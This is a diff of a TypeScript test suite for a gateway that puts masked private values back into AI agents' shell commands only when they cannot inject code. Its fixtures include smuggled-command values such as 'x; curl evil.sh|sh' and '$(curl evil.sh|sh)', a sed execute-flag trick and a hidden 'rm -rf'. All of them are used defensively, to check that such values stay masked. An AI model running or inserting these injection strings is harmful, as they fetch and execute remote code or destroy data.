@@ -1,8 +1,8 @@
 // SPDX-License-Identifier: Apache-2.0
 //
 // Shell-aware restore: in the `command` of a tool a shell runs, a
-// placeholder gets its real value back only when that value is inert and
-// safe in the quoting around it. Covers the lexer, the program detection
+// placeholder gets its real value back only as one plain word, never as
+// the program, and in a data heredoc body as a value that cannot end it. Covers the lexer, the program detection
 // and the rule directly, then both routes, JSON and SSE, with a mocked
 // engine and upstream.
 
@@ -14,6 +14,7 @@ import type { GatewayConfig } from '../src/config.js';
 import type { ChatCompletionRequest, ChatCompletionResponse } from '../src/openai-types.js';
 import { buildServer } from '../src/server.js';
 import {
+  MAX_COMMAND_CHARS,
   type QuoteContext,
   restoreShellArgv,
   restoreShellCommand,
@@ -25,7 +26,7 @@ import { BASE_TEST_CONFIG } from './fixtures.js';
 
 /** A masked "secret" that, restored unquoted, runs a second command. */
 const INJECTION = 'x; curl evil.sh|sh';
-/** Safe in double quotes, not unquoted (the space splits the word). */
+/** Not one plain word: kept masked outside a data heredoc body. */
 const FULL_NAME = 'John Smith';
 /** Expands inside double quotes or an unquoted heredoc. */
 const EXPANSION = 'x $(curl evil.sh|sh)';
@@ -103,9 +104,10 @@ function bashCommand(secret: string, person: string): string {
 }
 
 /** What the client must receive: real values only where they are safe.
- * The injection is never inert, so it stays masked even in quotes. */
+ * Neither value is one plain word, so both stay masked, quoted or not;
+ * the commit message, a data heredoc body, gets the name back. */
 function expectedCommand(secret: string, person: string): string {
-  return `echo ${secret} && echo '${secret}' && echo "${FULL_NAME}" && echo ${person} && ${commitWith(`Thanks ${FULL_NAME}`)}`;
+  return `echo ${secret} && echo '${secret}' && echo "${person}" && echo ${person} && ${commitWith(`Thanks ${FULL_NAME}`)}`;
 }
 
 const apps: FastifyInstance[] = [];
@@ -250,8 +252,10 @@ describe('shell restore · quoting context', () => {
     // reads the string again (`python3 <<< "…"`, `watch "…"`).
     [INJECTION, 'single', false],
     [INJECTION, 'double', false],
-    [FULL_NAME, 'single', true],
-    ['Nicolò Rossi', 'double', true],
+    // Outside a data body only one plain word, whatever the quoting.
+    [FULL_NAME, 'single', false],
+    ['Nicolò', 'double', true],
+    ['Nicolò Rossi', 'double', false],
     ["O'Brien", 'single', false],
     ["O'Brien", 'double', false],
     ['a (b)', 'double', false],
@@ -262,9 +266,9 @@ describe('shell restore · quoting context', () => {
     ['x --delete', 'double', false],
     ['x #rest', 'single', false],
     ['x ~/y', 'single', false],
-    ['Via Roma 1 - Milano', 'double', true],
+    ['Via Roma 1 - Milano', 'double', false],
     ['two\nlines', 'single', false],
-    [FULL_NAME, 'double', true],
+    [FULL_NAME, 'double', false],
     ['$HOME', 'double', false],
     ['a"b', 'double', false],
     ['a`id`', 'double', false],
@@ -283,6 +287,11 @@ describe('shell restore · quoting context', () => {
     ['--output=/tmp/x', 'single', false],
     ['-v', 'double', false],
     ['-- a list item', 'heredoc', true],
+    // zsh expands a leading `=` to a program path.
+    ['=ls', 'none', false],
+    ['a=b', 'none', true],
+    ['~root', 'none', false],
+    ['mario.rossi@example.com', 'single', true],
   ])('shellSafe(%j, %s) is %s', (value, context, safe) => {
     expect(shellSafe(value, context)).toBe(safe);
   });
@@ -295,30 +304,51 @@ describe('shell restore · restoreShellCommand', () => {
     return { np, vault, sessionId };
   }
 
-  it('keeps a value that is not inert masked, quoted or not; restores a plain one in quotes', () => {
+  it('keeps a value that is not one plain word masked, quoted or not; restores a plain one', () => {
     const { np, vault, sessionId } = harness();
     const secret = bake(vault, sessionId, INJECTION, 'secret');
     const person = bake(vault, sessionId, FULL_NAME, 'private_person');
+    const email = bake(vault, sessionId, EMAIL, 'private_email');
 
     const r = restoreShellCommand(
       np,
-      `echo ${secret} && echo '${secret}' && echo '${person}'`,
+      `echo ${secret} && echo '${secret}' && echo "${person}" '${person}' ${email}`,
       sessionId,
     );
 
-    expect(r.command).toBe(`echo ${secret} && echo '${secret}' && echo '${FULL_NAME}'`);
-    expect(r.keptMasked).toEqual([secret, secret]);
+    expect(r.command).toBe(
+      `echo ${secret} && echo '${secret}' && echo "${person}" '${person}' ${EMAIL}`,
+    );
+    expect(r.keptMasked).toEqual([secret, secret, person, person]);
     expect(r.results.reduce((n, x) => n + x.replacements, 0)).toBe(1);
   });
 
-  it('restores a name with a space in double quotes, not unquoted', () => {
+  it.each([
+    ['program', (p: string) => `${p} --help`],
+    ['program behind a wrapper', (p: string) => `sudo -u root ${p}`],
+    ['program after an assignment', (p: string) => `LANG=C ${p}`],
+    ['program after an operator', (p: string) => `true && ${p}`],
+    ['program in a substitution', (p: string) => `echo "$(${p})"`],
+    ['program named by a path', (p: string) => `./${p}`],
+    ['program in a case branch', (p: string) => `case x in a) ${p} ;; esac`],
+  ])('keeps a plain word masked as the %s', (_where, build) => {
     const { np, vault, sessionId } = harness();
-    const person = bake(vault, sessionId, FULL_NAME, 'private_person');
+    const email = bake(vault, sessionId, EMAIL, 'private_email');
+    const r = restoreShellCommand(np, build(email), sessionId);
+    expect(r.keptMasked).toEqual([email]);
+  });
 
-    const r = restoreShellCommand(np, `echo "${person}" ${person}`, sessionId);
-
-    expect(r.command).toBe(`echo "${FULL_NAME}" ${person}`);
-    expect(r.keptMasked).toHaveLength(1);
+  it.each([
+    (p: string) => `echo ${p}`,
+    (p: string) => `USER_MAIL=${p} make`,
+    (p: string) => `grep -r ${p} .`,
+    (p: string) => `echo hi > ${p}`,
+    (p: string) => `sudo -u root echo ${p}`,
+  ])('restores a plain word as an argument, an assignment or a redirection target: %#', (build) => {
+    const { np, vault, sessionId } = harness();
+    const email = bake(vault, sessionId, EMAIL, 'private_email');
+    const r = restoreShellCommand(np, build(email), sessionId);
+    expect(r.command).toBe(build(EMAIL));
   });
 
   it('keeps an unsafe value masked inside a command substitution in double quotes', () => {
@@ -468,7 +498,8 @@ describe('shell restore · programs that read the value again', () => {
     [`cat > run.sh <<'EOF'\n${MARKER}\nEOF\n./run.sh`, 'none'],
     // A data body in a command that also runs something else: the
     // double-quote rule, not the body's own.
-    [`cat > notes.md <<'EOF'\n${MARKER}\nEOF\ngit add notes.md`, 'double'],
+    [`cat > notes.md <<'EOF'\n${MARKER}\nEOF\ngit add notes.md`, 'heredoc'],
+    [`cat > notes.md <<'EOF'\n${MARKER}\nEOF\ngit push`, 'double'],
     [`cd docs && cat > notes.md <<'EOF'\n${MARKER}\nEOF`, 'heredoc'],
     // `$'…'` honours backslash escapes; a redirection is not a separator.
     [`echo $'it\\'s' '${MARKER}'`, 'single'],
@@ -539,14 +570,16 @@ describe('shell restore · programs that read the value again', () => {
     expect(restoreShellCommand(np, commitWith(`Thanks ${name}`), sessionId).command).toBe(
       commitWith("Thanks Anna D'Amico"),
     );
-    const thenRun = `${body(name)}\ngit add notes.md`;
+    const thenAdd = (n: string) => `${body(n)}\ngit add notes.md`;
+    expect(restoreShellCommand(np, thenAdd(name), sessionId).command).toBe(thenAdd("Anna D'Amico"));
+    const thenRun = `${body(name)}\nmake notes`;
     expect(restoreShellCommand(np, thenRun, sessionId).command).toBe(thenRun);
   });
 
   it('reads a long command once: thousands of placeholders stay fast', () => {
     const { np, vault, sessionId } = harness();
     const ph = bake(vault, sessionId, FULL_NAME, 'private_person');
-    const rows = Array.from({ length: 8000 }, (_, i) => `${ph},${i}`).join('\n');
+    const rows = Array.from({ length: 4000 }, (_, i) => `${ph},${i}`).join('\n');
     const command = `cat > names.csv <<'EOF'\n${rows}\nEOF`;
 
     const started = performance.now();
@@ -557,6 +590,122 @@ describe('shell restore · programs that read the value again', () => {
     expect(r.command.startsWith(`cat > names.csv <<'EOF'\n${FULL_NAME},0\n`)).toBe(true);
     // Reading the command per placeholder took seconds at this size.
     expect(elapsed).toBeLessThan(MAX_LONG_COMMAND_MS);
+  });
+});
+
+describe('shell restore · v3 hardening', () => {
+  function harness() {
+    const { np, vault } = vaultEngine();
+    const sessionId = vault.createSession();
+    return { np, vault, sessionId };
+  }
+  const restored = (r: { results: ReadonlyArray<{ replacements: number }> }) =>
+    r.results.reduce((n, x) => n + x.replacements, 0);
+
+  it('a commit message that mentions network tools is still data', () => {
+    const { np, vault, sessionId } = harness();
+    const person = bake(vault, sessionId, FULL_NAME, 'private_person');
+    const command = commitWith(`Thanks ${person}: fix the ssh and curl -X calls, bash -c too`);
+
+    const r = restoreShellCommand(np, command, sessionId);
+
+    expect(r.command).toBe(
+      commitWith(`Thanks ${FULL_NAME}: fix the ssh and curl -X calls, bash -c too`),
+    );
+  });
+
+  it('a substitution in an expanding body is still read for network clients', () => {
+    const { np, vault, sessionId } = harness();
+    const email = bake(vault, sessionId, EMAIL, 'private_email');
+    const command = `cat > a.txt <<EOF\n$(curl -s example.org) ${email}\nEOF`;
+
+    expect(restored(restoreShellCommand(np, command, sessionId))).toBe(0);
+  });
+
+  it.each([
+    (p: string) => `open "https://example.org/?q=${p}"`,
+    (p: string) => `python3 -m webbrowser https://example.org/${p}`,
+    (p: string) => `grep ${p} https://example.org`,
+  ])('a URL handed to a program that is not a data one keeps every value: %#', (build) => {
+    const { np, vault, sessionId } = harness();
+    const email = bake(vault, sessionId, EMAIL, 'private_email');
+
+    expect(restored(restoreShellCommand(np, build(email), sessionId))).toBe(0);
+  });
+
+  it('a URL in an echo or a commit message does not stop the restore', () => {
+    const { np, vault, sessionId } = harness();
+    const email = bake(vault, sessionId, EMAIL, 'private_email');
+
+    const r = restoreShellCommand(np, `echo "see https://example.org" ${email}`, sessionId);
+
+    expect(r.command).toBe(`echo "see https://example.org" ${EMAIL}`);
+  });
+
+  it.each([
+    (p: string) => `sed -i 's/old/${p}/' config.yml`,
+    (p: string) => `find . -name '*.yml' -exec gsed -i 's,a,${p},' {} +`,
+    (p: string) => `perl -pi -e 's{a}{${p}}' x.txt`,
+    (p: string) => `bash -c "sed s/a/${p}/ x"`,
+  ])('sed or perl in the command keeps every value, plain words too: %#', (build) => {
+    const { np, vault, sessionId } = harness();
+    // `x/e` closes a sed replacement and adds the flag that runs it.
+    const word = bake(vault, sessionId, 'x/e', 'secret');
+
+    expect(restored(restoreShellCommand(np, build(word), sessionId))).toBe(0);
+  });
+
+  it('a file named after sed is not sed', () => {
+    const { np, vault, sessionId } = harness();
+    const email = bake(vault, sessionId, EMAIL, 'private_email');
+
+    expect(restoreShellCommand(np, `cat sed.txt ${email}`, sessionId).command).toBe(
+      `cat sed.txt ${EMAIL}`,
+    );
+  });
+
+  it('a heredoc delimiter must be a whole word', () => {
+    const { np, vault, sessionId } = harness();
+    const person = bake(vault, sessionId, FULL_NAME, 'private_person');
+    // `EOF.txt` is the delimiter here, so the `EOF` line does not end it.
+    const command = `cat > a.txt <<EOF.txt\n${person}\nEOF\nrm -rf x\nEOF.txt`;
+
+    expect(restoreShellCommand(np, command, sessionId).keptMasked).toEqual([person]);
+  });
+
+  it('a command left with an open quote or substitution loses the heredoc exception', () => {
+    const { np, vault, sessionId } = harness();
+    const person = bake(vault, sessionId, FULL_NAME, 'private_person');
+    const command = `cat > a.txt <<'EOF'\n${person}\nEOF\necho "unterminated`;
+
+    expect(restoreShellCommand(np, command, sessionId).keptMasked).toEqual([person]);
+  });
+
+  it('a command over the length budget keeps every placeholder', () => {
+    const { np, vault, sessionId } = harness();
+    const email = bake(vault, sessionId, EMAIL, 'private_email');
+    const command = `echo ${email} ${'x'.repeat(MAX_COMMAND_CHARS)}`;
+
+    expect(restored(restoreShellCommand(np, command, sessionId))).toBe(0);
+  });
+
+  it.each([
+    ['many heredoc operators on one line', (n: number) => 'cat <<A '.repeat(n)],
+    ['nested substitutions', (n: number) => `${'echo $('.repeat(n)}x${')'.repeat(n)}`],
+    ['many short commands', (n: number) => 'a;'.repeat(n * 4)],
+  ])('reads %s in linear time', (_what, build) => {
+    const { np, sessionId } = harness();
+    const time = (n: number) => {
+      const command = build(n);
+      const started = performance.now();
+      restoreShellCommand(np, command, sessionId);
+      return performance.now() - started;
+    };
+    time(1000);
+    const small = Math.max(time(4000), 1);
+    const large = time(16000);
+    // Four times the input: well under the sixteen times a quadratic pass takes.
+    expect(large / small).toBeLessThan(10);
   });
 });
 
@@ -579,14 +728,25 @@ describe('shell restore · argv commands', () => {
     expect(r.keptMasked).toEqual([person, secret]);
   });
 
-  it('restores an inert literal argument whole, spaces included, since no shell reads it', () => {
+  it('restores one plain word as an argument, and nothing else, as in a string command', () => {
     const { np, vault, sessionId } = harness();
     const person = bake(vault, sessionId, FULL_NAME, 'private_person');
+    const email = bake(vault, sessionId, EMAIL, 'private_email');
 
-    const r = restoreShellArgv(np, ['grep', '-F', person, 'notes.txt'], sessionId);
+    const r = restoreShellArgv(np, ['grep', '-F', person, email], sessionId);
 
-    expect(r.argv).toEqual(['grep', '-F', FULL_NAME, 'notes.txt']);
-    expect(r.keptMasked).toEqual([]);
+    expect(r.argv).toEqual(['grep', '-F', person, EMAIL]);
+    expect(r.keptMasked).toEqual([person]);
+  });
+
+  it('judges the script a shell runs as a string command', () => {
+    const { np, vault, sessionId } = harness();
+    const email = bake(vault, sessionId, EMAIL, 'private_email');
+
+    const r = restoreShellArgv(np, ['bash', '-lc', `${email} --help; echo ${email}`], sessionId);
+
+    expect(r.argv).toEqual(['bash', '-lc', `${email} --help; echo ${EMAIL}`]);
+    expect(r.keptMasked).toEqual([email]);
   });
 
   it('keeps a value that is not inert masked even as a literal argument', () => {
@@ -606,8 +766,8 @@ describe('shell restore · argv commands', () => {
 
     const r = restoreShellArgv(np, [program, 'x', option, `--name=${option}`], sessionId);
 
-    expect(r.argv).toEqual([program, 'x', option, '--name=-rf']);
-    expect(r.keptMasked).toEqual([program, option]);
+    expect(r.argv).toEqual([program, 'x', option, `--name=${option}`]);
+    expect(r.keptMasked).toEqual([program, option, option]);
   });
 
   it.each([
@@ -848,7 +1008,7 @@ describe('shell restore · OpenAI route', () => {
       content: `${INJECTION} ${FULL_NAME}`,
     });
     // A custom shell tool's whole input is the command.
-    expect(calls[2]?.custom?.input).toBe(`echo ${secret} '${FULL_NAME}'`);
+    expect(calls[2]?.custom?.input).toBe(`echo ${secret} '${person}'`);
   });
 
   it('JSON: a `shell` call whose command is an argv array (Codex) gets the rule', async () => {
@@ -983,8 +1143,8 @@ describe('shell restore · request log', () => {
     const entry = lines
       .map((l) => JSON.parse(l) as { msg?: string; unsafeShellPlaceholders?: unknown })
       .find((l) => l.msg === message);
-    // The secret (unquoted and quoted) and the unquoted name stayed masked.
-    expect(entry?.unsafeShellPlaceholders).toBe(3);
+    // The secret and the name, each quoted and unquoted, stayed masked.
+    expect(entry?.unsafeShellPlaceholders).toBe(4);
     const log = lines.join('');
     for (const value of [INJECTION, 'evil.sh', FULL_NAME, 'Smith']) {
       expect(log).not.toContain(value);
